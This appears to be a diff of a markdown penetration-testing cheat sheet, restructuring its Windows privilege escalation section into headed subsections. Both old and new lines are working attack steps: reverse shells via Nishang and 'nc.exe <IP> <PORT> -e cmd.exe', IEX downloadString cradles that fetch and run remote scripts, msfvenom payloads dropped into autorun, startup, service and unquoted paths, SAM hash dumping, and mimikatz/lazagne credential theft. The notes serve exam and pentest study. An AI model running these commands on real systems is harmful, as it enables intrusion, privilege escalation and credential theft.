@@ -49,6 +49,19 @@
     - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
     - [Linux Troubleshooting](#linux-troubleshooting)
   - [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
+    - [PrivEsc Resources](#privesc-resources)
+      - [Attacks](#attacks)
+      - [Enumeration scripts](#enumeration-scripts)
+      - [Search for CVE](#search-for-cve)
+      - [Post exploitation](#post-exploitation)
+        - [Autorun](#autorun)
+        - [winPEAS.exe](#winpeasexe)
+        - [AlwaysInstallElevated](#alwaysinstallelevated)
+        - [Executable Files](#executable-files)
+        - [Startup applications](#startup-applications)
+        - [Weak service permission](#weak-service-permission)
+        - [Unquoted service paths](#unquoted-service-paths)
+        - [CVE](#cve)
     - [Windows Troublshooting](#windows-troublshooting)
   - [PROOFS](#proofs)
   - [REVERSE SHELL](#reverse-shell)
@@ -1269,89 +1282,90 @@ The -j option is to keep all the connected session in the background.
   - [Windows Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/)
   - [absolomb - 2018-01-26-Windows-Privilege-Escalation-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 
-- PrivEsc Resources
-  - [sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
-  - [FuzzySecurity](https://www.fuzzysecurity.com/tutorials/16.html)
-  - [Windows Exploit Suggester - AonCyberLabs](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-  - [Windows Exploit Suggester - 7Ragnarok7](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)
-  - [Windows privilege escalation (enumeration) script - Powerless](https://github.com/M4ximuss/Powerless)
-  - [Windows privilege escalation (enumeration) script - PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-  - [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
-  - [Win Priv Escl](https://github.com/frizb/Windows-Privilege-Escalation)
-  - [swisskyrepo - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-  - [checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
-  - [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
-  - [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+### PrivEsc Resources
+- [sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
+- [FuzzySecurity](https://www.fuzzysecurity.com/tutorials/16.html)
+- [Windows Exploit Suggester - AonCyberLabs](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+- [Windows Exploit Suggester - 7Ragnarok7](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)
+- [Windows privilege escalation (enumeration) script - Powerless](https://github.com/M4ximuss/Powerless)
+- [Windows privilege escalation (enumeration) script - PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+- [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [Win Priv Escl](https://github.com/frizb/Windows-Privilege-Escalation)
+- [swisskyrepo - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+- [checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
+- [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
+- [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
-- Attacks
-  - Test if powershell is working without breaking shell
-  - `powershell whoami`
-  - Pivot DoS to powershell using Nishang reverse powershell script.
-  - Listen w/ nc on a new port.
-  - Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
-  - Start an HTTP server in the root directoy of the modified nishang script copy
-  - Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
-  - Go to your listener terminal, you should now have a reverse PS shell
-  - Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
-  - `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
-  - Download file
-  - PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
-  - Run cmd as other user
-  - PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
-  - DOS > `\Windows\System32\runas.exe`
-  - Run exe
-  - PS from working directory `Start-Process -FilePath "sort.exe"`
-  - PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
-  - PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
-  - PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
-  - Decrypy SAM password hashes
-  - `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
-  - Determine admin accounts
-  - DOS: `net localgroup administrators`
-  - SAM and SYSTEM file location
-  - `Windows/System32/config`
-  - Log into remote windows host with stolen creds (SMB required)
-  - `psexec.py user@ip`
-  - Find shortcut location (`*.lnk`)
-  - PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
-  - Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
-  - Check panther directory, install logs get put in here and contain creds
-  - Read contents of file in PS shell
-  - `get-Content "filename"`
+#### Attacks
+- Test if powershell is working without breaking shell
+- `powershell whoami`
+- Pivot DoS to powershell using Nishang reverse powershell script.
+- Listen w/ nc on a new port.
+- Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
+- Start an HTTP server in the root directoy of the modified nishang script copy
+- Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
+- Go to your listener terminal, you should now have a reverse PS shell
+- Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
+- `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
+- Download file
+- PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
+- Run cmd as other user
+- PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
+- DOS > `\Windows\System32\runas.exe`
+- Run exe
+- PS from working directory `Start-Process -FilePath "sort.exe"`
+- PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
+- PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
+- PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
+- Decrypy SAM password hashes
+- `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
+- Determine admin accounts
+- DOS: `net localgroup administrators`
+- SAM and SYSTEM file location
+- `Windows/System32/config`
+- Log into remote windows host with stolen creds (SMB required)
+- `psexec.py user@ip`
+- Find shortcut location (`*.lnk`)
+- PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
+- Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
+- Check panther directory, install logs get put in here and contain creds
+- Read contents of file in PS shell
+- `get-Content "filename"`
 
-- Windows
-  - Enumeration scripts
+#### Enumeration scripts
+- General scans
+  - `winPEAS.exe`
+  - `windows-privesc-check2.exe`
+  - `Seatbelt.exe -group=all`
+  - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
+  - `Powerless.bat`
+  - `winPEAS.bat`
 
-  - General scans
-    - 
-      ```
-      winPEAS.exe
-      windows-privesc-check2.exe
-      Seatbelt.exe -group=all
-      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-      Powerless.bat
-      winPEAS.bat
-      ```
 
-- Search for CVE
-  - systeminfo > systeminfo.txt
+#### Search for CVE
+- systeminfo > systeminfo.txt
   - `python windows-exploit-suggester.py --update`
   - `python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt`
 
-  - systeminfo > systeminfo.txt
-  - 
-    ```
-    wmic qfe > qfe.txt
-    python wes.py -u
-    python wes.py systeminfo.txt qfe.txt
-    ```
+- wmic qfe > qfe.txt
+  - `python wes.py -u`
+  - `python wes.py systeminfo.txt qfe.txt`
 
-  - powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+- Run CVE Script (Like SHerlock.ps1)
+  - `powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"`
 
-- Post exploitation
-  - lazagne.exe all
-  - SharpWeb.exe
-  - mimikatz.exe
+#### Post exploitation
+- Methodology to follow
+  - <https://guif.re/windowseop>
+  - <https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/>
+  - <https://mysecurityjournal.blogspot.com/p/client-side-attacks.html>
+  - <http://www.fuzzysecurity.com/tutorials/16.html>
+  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>
+
+- Good Post Exploitation ExE's
+  - `lazagne.exe all`
+  - `SharpWeb.exe`
+  - `mimikatz.exe`
 
 - JuicyPotato (SeImpersonate or SeAssignPrimaryToken)
   - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
@@ -1362,44 +1376,37 @@ The -j option is to keep all the connected session in the background.
   - CLSID
     - <https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md>
 
-- Methodology to follow
-  - <https://guif.re/windowseop>
-  - <https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/>
-  - <https://mysecurityjournal.blogspot.com/p/client-side-attacks.html>
-  - <http://www.fuzzysecurity.com/tutorials/16.html>
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>
+##### Autorun
+- Detection
+  - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
+  - 
+    ```
+    [*] Checking for modifiable registry autoruns and configs...
 
-- Autorun
-  - Detection
-    - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
-    - 
-      ```
-      [*] Checking for modifiable registry autoruns and configs...
-
-      Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
-      Path           : "C:\Program Files\Autorun Program\program.exe"
-      ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}\
-      ```
+    Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+    Path           : "C:\Program Files\Autorun Program\program.exe"
+    ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}\
+    ```
 
 - or
 
-- winPEAS.exe
-  - 
-    ```
-    [+] Autorun Applications(T1010)
-        Folder: C:\Program Files\Autorun Program
-        File: C:\Program Files\Autorun Program\program.exe
-        FilePerms: Everyone [AllAccess]
-    ```
+##### winPEAS.exe
+- 
+  ```
+  [+] Autorun Applications(T1010)
+      Folder: C:\Program Files\Autorun Program
+      File: C:\Program Files\Autorun Program\program.exe
+      FilePerms: Everyone [AllAccess]
+  ```
 
 - Exploitation
-  - Attacker
-    - 
-      ```
-      msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
-      sudo python -m SimpleHTTPServer 80
-      sudo nc -lvp <PORT>
-      ```
+- Attacker
+  - 
+    ```
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+    sudo python -m SimpleHTTPServer 80
+    sudo nc -lvp <PORT>
+    ```
 
 - Victim
   - 
@@ -1410,69 +1417,164 @@ The -j option is to keep all the connected session in the background.
     To execute it with elevated privileges we need to wait for someone in the Admin group to login.
     ```
 
-- AlwaysInstallElevated
-  - Detection
+##### AlwaysInstallElevated
+- Detection
+- 
+    ```
+    powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+    [*] Checking for AlwaysInstallElevated registry key...
+
+    AbuseFunction : Write-UserAddMSI
+    ```
+
+- or
   - 
-      ```
-      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+    ```
+    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+    reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 
-      [*] Checking for AlwaysInstallElevated registry key...
+    If both values are equal to 1 then it's vulnerable.
+    ```
 
-      AbuseFunction : Write-UserAddMSI
-      ```
+- or
+  - 
+    ```
+    winPEAS.exe
 
-  - or
-    - 
-      ```
-      reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-      reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+    [+] Checking AlwaysInstallElevated(T1012)
 
-      If both values are equal to 1 then it's vulnerable.
-      ```
-
-  - or
-    - 
-      ```
-      winPEAS.exe
-
-      [+] Checking AlwaysInstallElevated(T1012)
-
-        AlwaysInstallElevated set to 1 in HKLM!
-        AlwaysInstallElevated set to 1 in HKCU!
-      ```
+      AlwaysInstallElevated set to 1 in HKLM!
+      AlwaysInstallElevated set to 1 in HKCU!
+    ```
 
 - Exploitation
-  - Attacker
+- Attacker
+- 
+  ```
+  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
+  sudo python -m SimpleHTTPServer 80
+  sudo nc -lvp <PORT>
+  ```
+
+- Victim
+- 
+  ```
+  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
+  msiexec /quiet /qn /i C:\Temp\program.msi
+  ```
+
+##### Executable Files
+- Detection
+- 
+  ```
+  powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+  [*] Checking service executable and argument permissions...
+
+  ServiceName                     : filepermsvc
+  Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+  ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+  ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+  ModifiableFileIdentityReference : Everyone
+  StartName                       : LocalSystem
+  AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+  CanRestart                      : True
+  ```
+
+- or
+- 
+  ```
+  winPEAS.exe
+
+  [+] Interesting Services -non Microsoft-(T1007)
+
+  filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+    File Permissions: Everyone [AllAccess]
+  ```
+
+- Exploitation
+- Attacker
+- 
+  ```
+  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+  sudo python -m SimpleHTTPServer 80
+  sudo nc -lvp <PORT>
+  ```
+
+- Victim
   - 
     ```
-    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
-    sudo python -m SimpleHTTPServer 80
-    sudo nc -lvp <PORT>
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
+    copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+    sc start filepermsvc
     ```
 
-  - Victim
+##### Startup applications
+- Detection
+- 
+  ```
+  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+  C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+                                                              TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+                                                              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                              BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                              BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                              Everyone:(I)(OI)(CI)(RX)
+
+  If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+  ```
+
+- Exploitation
+- Attacker
+- 
+  ```
+  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+  sudo python -m SimpleHTTPServer 80
+  sudo nc -lvp <PORT>
+  ```
+
+- Victim
+- 
+  ```
+  cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+  To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+  ```
+
+##### Weak service permission
+- Detection
   - 
     ```
-    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
-    msiexec /quiet /qn /i C:\Temp\program.msi
+    # Find all services authenticated users have modify access onto
+    accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+    if SERVICE_ALL_ACCESS then vulnerable
+
+    # Find all weak folder permissions per drive.
+    accesschk.exe /accepteula -uwdqs Users c:\
+    accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+    # Find all weak file permissions per drive.
+    accesschk.exe /accepteula -uwqs Users c:\*.*
+    accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
     ```
 
-- Executable Files
-  - Detection
+- or
   - 
     ```
     powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
 
-    [*] Checking service executable and argument permissions...
+    [*] Checking service permissions...
 
-    ServiceName                     : filepermsvc
-    Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
-    ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
-    ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
-    ModifiableFileIdentityReference : Everyone
-    StartName                       : LocalSystem
-    AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
-    CanRestart                      : True
+    ServiceName   : daclsvc
+    Path          : "C:\Program Files\DACL Service\daclservice.exe"
+    StartName     : LocalSystem
+    AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+    CanRestart    : True
     ```
 
 - or
@@ -1482,169 +1584,74 @@ The -j option is to keep all the connected session in the background.
 
     [+] Interesting Services -non Microsoft-(T1007)
 
-    filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
-      File Permissions: Everyone [AllAccess]
-    ```
+    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+      YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
 
+    [+] Modifiable Services(T1007)
+      LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+      daclsvc: WriteData/CreateFiles
+    ```
 - Exploitation
-  - Attacker
   - 
     ```
-    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+    # Attacker
     sudo python -m SimpleHTTPServer 80
     sudo nc -lvp <PORT>
+
+    # Victim
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+    sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+    sc start <SERVICENAME>
+    or 
+    net start <SERVICENAME>
     ```
 
-  - Victim
-    - 
-      ```
-      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
-      copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
-      sc start filepermsvc
-      ```
-
-- Startup applications
-  - Detection
+##### Unquoted service paths
+- Detection
   - 
-    ```
-    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+  ```
+  powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
 
-    C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
-                                                                TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
-                                                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
-                                                                BUILTIN\Administrators:(I)(OI)(CI)(F)
-                                                                BUILTIN\Users:(I)(OI)(CI)(RX)
-                                                                Everyone:(I)(OI)(CI)(RX)
+  [*] Checking for unquoted service paths...
 
-    If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
-    ```
+  ServiceName    : unquotedsvc
+  Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+  ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
+  StartName      : LocalSystem
+  AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+  CanRestart     : True
+
+  ServiceName    : unquotedsvc
+  Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+  ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
+  StartName      : LocalSystem
+  AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+  CanRestart     : True
+  ```
+
+- or
+  - 
+  ```
+  winPEAS.exe
+
+  [+] Interesting Services -non Microsoft-(T1007)
+
+  unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+  ```
 
 - Exploitation
-  - Attacker
   - 
-    ```
-    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
-    sudo python -m SimpleHTTPServer 80
-    sudo nc -lvp <PORT>
-    ```
+  ```
+  # Attacker
+  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
+  sudo python -m SimpleHTTPServer 80
+  sudo nc -lvp <PORT>
 
-  - Victim
-  - 
-    ```
-    cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
-
-    To execute it with elevated privileges we need to wait for someone in the Admin group to login.
-    ```
-
-- Weak service permission
-  - Detection
-    - 
-      ```
-      # Find all services authenticated users have modify access onto
-      accesschk.exe /accepteula -uwcqv "Authenticated Users" *
-
-      if SERVICE_ALL_ACCESS then vulnerable
-
-      # Find all weak folder permissions per drive.
-      accesschk.exe /accepteula -uwdqs Users c:\
-      accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
-
-      # Find all weak file permissions per drive.
-      accesschk.exe /accepteula -uwqs Users c:\*.*
-      accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
-      ```
-
-  - or
-    - 
-      ```
-      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-      [*] Checking service permissions...
-
-      ServiceName   : daclsvc
-      Path          : "C:\Program Files\DACL Service\daclservice.exe"
-      StartName     : LocalSystem
-      AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
-      CanRestart    : True
-      ```
-
-  - or
-    - 
-      ```
-      winPEAS.exe
-
-      [+] Interesting Services -non Microsoft-(T1007)
-
-      daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
-        YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
-
-      [+] Modifiable Services(T1007)
-        LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
-        daclsvc: WriteData/CreateFiles
-      ```
-  - Exploitation
-    - 
-      ```
-      # Attacker
-      sudo python -m SimpleHTTPServer 80
-      sudo nc -lvp <PORT>
-
-      # Victim
-      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
-      sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
-      sc start <SERVICENAME>
-      or 
-      net start <SERVICENAME>
-      ```
-
-- Unquoted service paths
-  - Detection
-    - 
-      ```
-      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
-
-      [*] Checking for unquoted service paths...
-
-      ServiceName    : unquotedsvc
-      Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-      ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
-      StartName      : LocalSystem
-      AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
-      CanRestart     : True
-
-      ServiceName    : unquotedsvc
-      Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
-      ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
-      StartName      : LocalSystem
-      AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
-      CanRestart     : True
-      ```
-
-    - or
-      - 
-      ```
-      winPEAS.exe
-
-      [+] Interesting Services -non Microsoft-(T1007)
-
-      unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
-      ```
-
-    - Exploitation
-      - 
-      ```
-      # Attacker
-      msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
-      sudo python -m SimpleHTTPServer 80
-      sudo nc -lvp <PORT>
-
-      # Victim
-      cd "C:\Program Files\Unquoted Path Service\"
-      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
-      sc start unquotedsvc
-      ```
+  # Victim
+  cd "C:\Program Files\Unquoted Path Service\"
+  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
+  sc start unquotedsvc
+  ```
 
 - Hot potato
   - Exploitation
@@ -1660,7 +1667,7 @@ The -j option is to keep all the connected session in the background.
       powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
       ```
 
-- CVE
+##### CVE
 - Already compiled exploit
   - <https://github.com/SecWiki/windows-kernel-exploits>
   - <https://github.com/abatchy17/WindowsExploits>
